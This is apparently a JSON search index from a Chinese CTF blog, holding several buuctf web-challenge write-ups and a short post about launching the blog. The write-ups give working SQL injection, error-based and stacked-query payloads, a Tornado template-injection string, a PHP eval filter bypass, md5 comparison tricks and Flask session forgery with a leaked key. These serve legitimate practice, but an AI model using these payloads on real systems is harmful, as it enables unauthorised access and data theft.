29-[GXYCTF2019]BabySQli","url":"/post/b32b8b53.html","content":"\nbuuctf [GXYCTF2019]BabySQli\n\n<!--more-->\n\n抓包发现一串密文：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346082.png)\n\n`MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5` 这是一串base32编码，base32编码特征是只有大写字母和数字\n\n解密后：`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==` 这是一串base64编码，base64编码特点是有大小写字母和数字而且末尾常常是等于号\n\n解码 得到：`select * from user where username = '$name'`\n\n意思是让我们从登录名进行注入\n\n这个题目过滤了蛮多常用查询字符，可以bp抓包 fuzz一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082345905.png)\n\n显示419就是被河蟹的 415就是正常回显\n\n过滤了 常用的`or``（）` 然后可以大写绕过\n\n构造`1' Order by 4#` 发现报错只有三列\n\n这里再提供一种select查询爆字段的方法\n\n`select 1,2#` 报错 `select 1,2,3#` 正常回显也可以用来判断字段数\n\n然后就不会了 看了其他大佬的wp\n\n这里利用了一个mysql联合查询的特性：\n\n**union做查询时，查询的数据不存在，那么联合查询就会创建一个虚拟的数据存放在数据库中**\n\n具体可以看这篇大佬的详细wp：https://www.tqwba.com/x_d/jishu/272679.html\n\n由于只能通过admin账户,因此让虚拟用户的名字是admin 同时密码转换成了md5存储(猜测应该是为了保护用户的隐私,md5不可逆,这就让即使身为管理员也不能知道用户密码)于是在构造的时候要注意数据库密码应该是md5模式的.同时登入时输入对应的明文密码即可。\n\n 构造：`name=123'union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1`\n\n其中 md5值为1的md5值，这里就是构造了 当后台检测`1 = md（1）`时为真 成功登录\n\n其实就是 后台去查找符合密码为1的md5值  但是本来没有 我们利用联合查询特性构造了一个无中生有 于是能成功登录\n","tags":["sql注入","联合查询特性","base32"],"categories":["buuctf"]},{"title":"buuctf 25-[极客大挑战 2019]HardSQL","url":"/post/58b11103.html","content":"\nbuuctf [极客大挑战 2019]HardSQ\n\n<!--more-->\n\n这个题目是报错注入的典型，值得记录一下\n\n简单尝试之后常见的字符比如空格 union都被黑名单了 尝试用/**/绕过空格但还是不行，只能用（）来绕过空格\n\n这里测试空格是否被河蟹 不能通过1'加空格 这样测试是不对的\n\n最好是用`1' #`这样测试比较正确，因为一般题目不会河蟹#字符\n\n空格绕过的原理： 括号是来包含子查询的，任何可以计算出结果的语句都可以用括号围起来，而括号的两端，可以没有多余的空格  \n\nso 所以只能用报错注入了，这里就好好回顾一下报错注入\n\n一般报错注入分为两个函数：updatexml() 与extractvalue()\n\n就拿updatexml举例 他们两的差别就只是传参上\n\n`updatexml(1，2，3)`函数总共有三个参数，当第二个参数有特殊符号时，就会触发数据库报错，而且将参数2的内容显示在报错信息中，常用是`~`他的十六进制用`0x7e`表示\n\n然后，报错注入常用拼接函数 concat和group_concat\n\n`concat`和`group_concat`都是用在sql语句中做拼接使用的，但是两者使用的方式不尽相同，`concat`是针对以行数据做的拼接，而`group_concat`是针对列做的数据拼接，且`group_concat`自动生成逗号。\n\n所以格式一般为：`updatexml(1,concat(0x7e,sql语句,0x7e),1)`\n\n然而，`extractvalue(1，2`)只有两个参数，当第二个参数具有特殊符号时，则会报错。\n\n格式为：`extractvalue( 1,concat(0x7e,sql语句))`\n\n回到题目：\n\n其实题目本身就是考察报错注入与绕过空格 这里就简单谢谢payload：\n\n```\n1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#\n```\n\nXPATH syntax error: '~geek~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))#\n```\n\nXPATH syntax error: '~H4rDsq1~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#\n```\n\nXPATH syntax error: '~id,username,password~'\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~1flagflag{9804c176-72e3-46d2-90'\n\n这里flag显示的不完全，用到left 和 right函数\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346493.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346308.png)\n\n```\n1'or(updatexml(1,concat(0x7e,(select(right(password,35))from(H4rDsq1)),0x7e),1))#\n```\n\nXPATH syntax error: '~04c176-72e3-46d2-902b-0e79f4ea1'\n\n查询到其余的flag\n\n因为还河蟹了= 所以用了like语句\n\n完成！\n","tags":["sql注入","报错注入","空格绕过"],"categories":["buuctf"]},{"title":"buuctf 22-admin","url":"/post/b64980cf.html","content":"\nbuuctf  admin\n\n<!--more-->\n\n这到题目有一个非预期，弱口令直接爆出来了，直接账号为admin，密码为123就能拿到flag，我还想这题怎么这么简单，看了别人的题解才发现又是一道学习的题目。\n\n预期解：\n\n先申请一个账号，抓包看到：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346193.png)\n\n那么这道题的思路就是让我去登录管理员的账号就能拿到flag了，但是不知道密码\n\n学习别人的wp：\n\n在源码中发现一个github链接：<!-- https://github.com/woadsl1234/hctf_flask/ -->\n\n打开是一个flask项目，Flask是一个用Python编写的Web应用程序框架\n\n比较重要的文件就是：\n\nuser.sql这是一个建数据库的文件\n\nrun.py 就是启动这个程序 把端口开放在互联网中\n\napp文件中 routes.py 对应路由 非常重要 flask中就是一个一个路由组成的\n\n查看源码：\n\n```php\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\n\nfrom flask import Flask, render_template, url_for, flash, request, redirect, session, make_response\nfrom flask_login import logout_user, LoginManager, current_user, login_user\nfrom app import app, db\nfrom config import Config\nfrom app.models import User\nfrom forms import RegisterForm, LoginForm, NewpasswordForm\nfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprep\nfrom io import BytesIO\nfrom code import get_verify_code\n\n\n@app.route('/code')\ndef get_code():\n    image, code = get_verify_code()\n    # 图片以二进制形式写入\n    buf = BytesIO()\n    image.save(buf, 'jpeg')\n    buf_str = buf.getvalue()\n    # 把buf_str作为response返回前端，并设置首部字段\n    response = make_response(buf_str)\n    response.headers['Content-Type'] = 'image/gif'\n    # 将验证码字符串储存在session中\n    session['image'] = code\n    return response\n\n\n@app.route('/')\n@app.route('/index')\ndef index():\n    return render_template('index.html', title = 'hctf')\n\n\n@app.route('/register', methods = ['GET', 'POST'])\ndef register():\n\n\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = RegisterForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        if session.get('image').lower() != form.verify_code.data.lower():\n            flash('Wrong verify code.')\n            return render_template('register.html', title = 'register', form=form)\n        if User.query.filter_by(username = name).first():\n            flash('The username has been registered')\n            return redirect(url_for('register'))\n        user = User(username=name)\n        user.set_password(form.password.data)\n        db.session.add(user)\n        db.session.commit()\n        flash('register successful')\n        return redirect(url_for('login'))\n    return render_template('register.html', title = 'register', form = form)\n\n\n@app.route('/login', methods = ['GET', 'POST'])\ndef login():\n    if current_user.is_authenticated:\n        return redirect(url_for('index'))\n\n\n    form = LoginForm()\n    if request.method == 'POST':\n        name = strlower(form.username.data)\n        session['name'] = name\n        user = User.query.filter_by(username=name).first()\n        if user is None or not user.check_password(form.password.data):\n            flash('Invalid username or password')\n            return redirect(url_for('login'))\n        login_user(user, remember=form.remember_me.data)\n        return redirect(url_for('index'))\n    return render_template('login.html', title = 'login', form = form)\n\n\n@app.route('/logout')\ndef logout():\n    logout_user()\n    return redirect('/index')\n\n\n@app.route('/change', methods = ['GET', 'POST'])\ndef change():\n    if not current_user.is_authenticated:\n        return redirect(url_for('login'))\n    form = NewpasswordForm()\n    if request.method == 'POST':\n        name = strlower(session['name'])\n        user = User.query.filter_by(username=name).first()\n        user.set_password(form.newpassword.data)\n        db.session.commit()\n        flash('change successful')\n        return redirect(url_for('index'))\n    return render_template('change.html', title = 'change', form = form)\n\n\n@app.route('/edit', methods = ['GET', 'POST'])\ndef edit():\n    if request.method == 'POST':\n        \n        flash('post successful')\n        return redirect(url_for('index'))\n    return render_template('edit.html', title = 'edit')\n\n\n@app.errorhandler(404)\ndef page_not_found(error):\n    title = unicode(error)\n    message = error.description\n    return render_template('errors.html', title=title, message=message)\n\n\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n## 预期解一：\n\nunicode特殊字符绕过\n\n代码审计 看到上面注册，登录，修改系统均有一个转小写的操作strlower(),并且这个转小写的函数不是python自带的，是自己封装的，那么这是非常不正常的。\n\n```php\ndef strlower(username):\n    username = nodeprep.prepare(username)\n    return username\n```\n\n这里通过调用nodeprep模块，nodeprep.prepare这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A\n\n在代码开头有一行代码：`from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep`，说明nodeprep是从twisted模块中导入的，利用nodeprep.prepare函数会将unicode字符ᴬ转换成A，而A在调用一次nodeprep.prepare函数会把A转换成a。而值得注意的是strlower()自定义函数被调用了三次，分别是register、login、change，即注册、登陆、修改密码时都会被调用。\n\n思路：用ᴬdmin注册，后台代码就会调用一次nodeprep.prepare函数，把用户名转换成Admin；修改一次密码，再次调用nodeprep.prepare函数，使用户名由Admin转换为admin，重新登陆，就可以得到flag。\n\n## 预期解二：\n\n抓包发现session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346152.png)\n\nflask session伪造\n\n先了解一下session：简单说就是保持会话登录，识别用户\n\n但是一般session是存储在服务器的，但是flask存储在客户端，他是对称加密解密，所以可以进行解码然后伪造编码上传。\n\n在config.py拿到密钥`ckj123` 待会进行加密解密的时候用\n\n```php\nimport os\n\n\nclass Config(object):\n    SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'\n    SQLALCHEMY_DATABASE_URI = 'mysql+pymysql://root:adsl1234@db:3306/test'\n    SQLALCHEMY_TRACK_MODIFICATIONS = True\n```\n\n从网上下载一个session 解密加密的脚本\n\n构造payload：\n\n```\npython flask_session_cookie_manager3.py decode -c \".eJw9kMFuwjAMhl9l8plDm5YLEgemdB0Hu8qWEjmXCkopTQmTCohRxLsvYhIHS7Z_-f9s36HaDc1pD7PzcGkmUHVbmN3hbQMzKPKPrtBLgbqOUW4PaErB2jqbr5yVKmXPKcrVnn0WUW571iys6688coRSCZRZZE0WZjkmjVdyeGNdJoXkaYgUfRnqVlCu0sKwIPkeGFmChnrUiyhwPAl1Q8eJdXVa6D4msRzRqF8y9hB6IbcdjWoOjwnUp2FXnX_65vg6wfqvA_rlSIavNlcjujJgbMeunQbEaCX5sF5q8-xGrkxYZFNazJ92nV-3zcvp28efZfuvHNc-CLDe1DCBy6kZnl-DOILHHzuQaZg.Y-IrhQ.zQZe9rQP9NoUHeJmwwmmUuZ6x-Q\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346053.png)\n\n得到：\n\n```\n{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'abc', 'user_id': '10'}\n```\n\n将我们创建的abc改为admin 然后再加密 bp抓包修改\n\n构造payload：\n\n```\npython flask_session_cookie_manager3.py encode -t \"{'_fresh': True, '_id': b'8ab92617507e1e6a6cdecd48bf805aba44fda66f90c64046014ea5065530632a578698682e2a864d89f640e1a71cd104def7d2267f789957b31d15fef731fb74', 'csrf_token': b'fde2b35f0dd325646bb89103d3f068da2657ca94', 'image': b'JmGR', 'name': 'admin', 'user_id': '10'}\" -s \"ckj123\"\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346142.png)\n\n得到：\n\n```\n.eJw9kLFuwkAMhl-l8syQXMKCxEB1IWWwo2svRPaCKISQC0elAKIE8e49UYnBku1f_j_bd1jt-vq0h8m5v9QjWLVbmNzh7RsmUOTztrALhXYTo94esCoVW3GSL51ok7LnFPVyzz6LKJeOLStx3ZUHjlAbhTqLpMrCLMdk8UoOb2zLpNA8DpGiL0PdKMpNWlSsSL8HRpZgRR3aWRQ4npS5oeNE3CYtbBeTWgxYmV-q5BB6IZeWBjOFxwg2p363Ov909fF1gvjPA_rFQBVfJTcDujJgpGXXjANiEE0-rJdKnt3IlQmrbEyz6dOu9eumfjl9-fijbP6V49oHAdZb3x5hBJdT3T__BnEEjz8Vlmp7.Y-IsQQ.ZB68OAuy6kj1z0CD9iH_lurm7zY\n```\n\n更换session，成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082346032.png)\n","tags":["flask框架","弱口令","unicode特殊字符"],"categories":["buuctf"]},{"title":"buuctf 21-[BJDCTF2020]Easy MD5","url":"/post/eef45ee2.html","content":"\nbuuctf [BJDCTF2020]Easy MD5\n\n<!--more-->\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347242.png)\n\n思路：看到url上又password字样，又有输入栏，随便传入admin然后抓包试试，发现提示。\n\n![img](https://cdn.nlark.com/yuque/0/2023/png/34855848/1672999105035-1d740daa-ecd7-4e10-b27c-295c05f5b80c.png)\n\n显示`select * from 'admin' where password=md5($pass,true)`\n\n**分析：通过sql语句，从admin表里查数据，当password=md（）函数加密后的pass时就可查询。**\n\n**考点：**\n\n1. **sql语句注入**\n2. **md5（）函数：本来应该返回32 位的十六进制数形式散列值，但是此题可选的 binary 被设置为 true，那么 md5 摘要将以 16 位的原始二进制格式返回。**\n\n看到作业提示md5在sql注入中常见的搭档是字符串ffifdyop，然后去谷歌，csdn看看这是什么东西。\n\n**ffifdyop**\n\n经过[md5](https://so.csdn.net/so/search?q=md5&spm=1001.2101.3001.7020)加密后：276f722736c95d99e921722cf9ed621c\n\n再转换为[字符串](https://so.csdn.net/so/search?q=字符串&spm=1001.2101.3001.7020)：'or'6<乱码>  即  'or'66�]��!r,��b\n\n**原理：md5（）函数先把** `**ffifdyop**`**加密为**`**276f722736c95d99e921722cf9ed621c**`**Mysql 又会把 hex （十六进制）转成 ascii 解释** \n\n 在or的两边要有单引号，使它变成 password=‘xxx’or‘xxx’ 的形式  \n\n 因此拼接之后的形式是select * from ‘admin’ where password=’’ or ‘6xxxxx’  为一个永真式\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347249.png)\n\n\n\n输入得到代码：\n\n```php\n$a = $GET['a'];\n$b = $_GET['b'];\n\n\nif($a != $b && md5($a) == md5($b)){\n    // wow, glzjin wants a girl friend.\n```\n\n**分析：通过get传参a，b，使得题目md5值弱相等 。**\n\n**方法：**\n\n1. **数组绕过**\n2. **md5（）值碰撞，有一些特殊的数值在md5（）加密后会形成0e开头的字符串，从而达到弱相等**\n\n**md5（）碰撞原理：**\n\n```php\n<?php\n$a=md5('QNKCDZO');\n$b=md5('s878926199a');\necho $a;\necho \"\\n\";\necho $b;\necho \"\\n\";\nif($a==$b)\n{\n    echo \"他们弱相等\";\n}\n?>\n输出：\n0e830400451993494058024219903391\n0e545993274517709034328855841020\n他们弱相等\n```\n\n选择任何方法都行，之后得到：\n\n```php\n<?php\nerror_reporting(0);\ninclude \"flag.php\";\n\n\nhighlight_file(__FILE__);\n\n\nif($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){\n    echo $flag;\n}\n```\n\n同理，不过之后是强类型相等，估计这一关是考察数组绕过吧，之后得到flag\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082347369.png)\n","tags":["md5绕过","ffifdyop特殊字符串"],"categories":["buuctf"]},{"title":"buuctf 20-[护网杯 2018]easy_tornado","url":"/post/98e6259a.html","content":"\nbuuctf 20-[护网杯 2018]easy_tornado\n\n<!--more-->\n\n这是一道毫无头绪的题目，就当作学习了。\n\n进入之后有三个页面内容分别为：\n\nflag in /fllllllllllllag\n\nrender\n\nmd5(cookie_secret+md5(filename))\n\n发现请求过程很奇怪\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349588.png)\n\n通过filename请求一个文件然后filehash请求一个哈西值 也就是加密了一下\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349619.png)\n\n如果不请求哈希值试一下 直接报错，并且注意：`/error?msg=Error`直接来看大佬的wp\n\nrender是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过`{{}}`进行传递变量和执行简单的表达式。\n\nTornado是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快\n\n在tornado模板中，存在一些可以访问的快速对象,这里用到的是`handler.settings`，`handler`指向`RequestHandler`，而`RequestHandler.settings`又指向`self.application.settings`，所以handler.settings就指向`RequestHandler.application.settings`了，这里面就是我们的一些环境变量.\n\n然后通过环境变量去获取`cookie_secret`\n\n构造payload ：`/error?msg={{handler.settings}}`\n\n得到：`{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '76a26309-3853-4c68-b91e-eee75246e722'}`\n\n发现了`cookie_secret `\n\n之后将`/fllllllllllllag`加密一下将`cookie_secret` 加上 再进行一次md5加密就可以获得flag了\n\n构造payload：`?filename=/fllllllllllllag&filehash=99d14d071426405f00eca73ec4a5eb64`\n\n成功！\n","tags":["render渲染","python","环境变量"],"categories":["buuctf"]},{"title":"buuctf 18-[RoarCTF 2019]Easy Calc","url":"/post/318fd29a.html","content":"\nbuuctf 18-[RoarCTF 2019]Easy Calc\n\n<!--more-->\n\n抓包发现提交方式为：\n\n给/cal.php 以get方式提交一个$num变量\n\n发现黑名单过滤\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\n发现好多读文件的空格，斜杠都被黑名单了。\n\ncsdn有一篇总结的很好，拉过来\n\n知识点：\n\nchr() 函数：从指定的 ASCII 值返回字符。 ASCII 值可被指定为十进制值、八进制值或十六进制值。八进制值被定义为带前置0，而十六进制值被定义为带前置 0x。\n\n file_get_contents() 函数：把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。\n\n PHP的字符串解析特性：PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）【当waf不让你过的时候，php却可以让你过】。假如waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。\n\n scandir() 函数：返回指定目录中的文件和目录的数组。\n\n构造：`? num=var_dump(scandir(chr(47)))`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082348852.png)\n\n发现flag文件，现在构造payload将里面内容读出来就行了\n\n```\n? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))\n```\n\n这里最好不用echo 因为空格被黑名单了 用print_r或者var_dump都行\n","tags":["文件包含","php字符串解析特性"],"categories":["buuctf"]},{"title":"buuctf 6-[强网杯 2019]随便注","url":"/post/73bb3fc4.html","content":"\nbuuctf [强网杯 2019]随便注\n\n<!--more-->\n\n正常操作后，发现只有两列，然后有正则匹配过滤了\n\nreturn preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject);\n\n这题考了堆叠注入，原理很简单，就是通过 `;` 号注入多条SQL语句。\n\n```\n-1';show databases;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349074.png)\n\n看一下当前的数据库，这里考到了报错注入\n\n原理：\n\nMySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。\n\n但是这题update被过滤了\n\nextractvalue() 传参时候稍有不同，其余都是一样的，用这两个函数时，常常用到拼接函数，将要要查询的语句和第二个特殊符号拼接起来一起回显。\n\nsql里拼接函数：concat，concat_ws ,group_concat\n\n`1' and extractvalue(1,concat(0x7e,database(),0x7e));` 0x7e 是十六进制~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349098.png)\n\n当前数据库在supersqli 注意结果是按照报错的方式回显的。\n\n`-1';show tables;`爆表\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349087.png)\n\nflag在那串数字里\n\n表名为数字时，要用反引号包起来查询。\n\n```\n-1';show columns from `1919810931114514`;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349045.png)\n\n然后要使用存储过程预编译知识，构造能执行的语句\n\n方法一：\n\nset @name1 = sql 语句；\n\nprepare name2 from @name1\n\nEXECUTE name2\n\n注意：一个@是用户变量，两个@是系统变量\n\n方法二：\n\nprepare name1 from 一个sql语句;\n\nEXECUTE name1；\n\n\n\nname1,name2的意思是一个名字\n\n其实两者原理都一样\n\n构造：\n\n```\n1';set @a = concat('se','lect * from `1919810931114514`;');prepare b from @a;EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349034.png)\n\nstrstr()函数对大小写很敏感，通过大写绕过即可。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349106.png)\n\n```\n1';Set @a = concat('se','lect * from `1919810931114514`;'); Prepare b from @a; EXECUTE b;\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349435.png)\n","tags":["sql注入","堆叠注入","报错注入"],"categories":["buuctf"]},{"title":"小破站破壳了","url":"/post/1c316701.html","content":"\n想来想去，看了其他许多大佬的文章，起初萌生了想建造一个属于自己的网站，但是建站不是一个简单的事情，只靠我现在的知识水平是完全不够的，于是就想简单简答的建造一个博客，用来分享我的一些做题过程与生活琐事。\n\n<!--more-->\n\n2023.2.5，今天属于我的博客小破站建成了（开心~），虽然只是简单运用了hexo和大家都知道的next主题，傻瓜式建造最后上传至github，但是整个过程还是蛮曲折的，建造过程报了好多错误，但是还是靠着查询一点一点修改，最终一个简简单单的小博客站建好了。\n\n在这个博客中我会用来分享一些做题刷题的过程，其实就是监督自己，不要三天打鱼两天晒网。如果你看到我的wp中有错误，我非常欢迎您能给我指出。其次分享一下自己在生活中的所见所闻所感，让之后的自己回味会觉得之前的日子过得有意义一点。\n\n希望我能守住自己的初心\n\n2023.2.5 \n\nZ1d10t\n\n"}]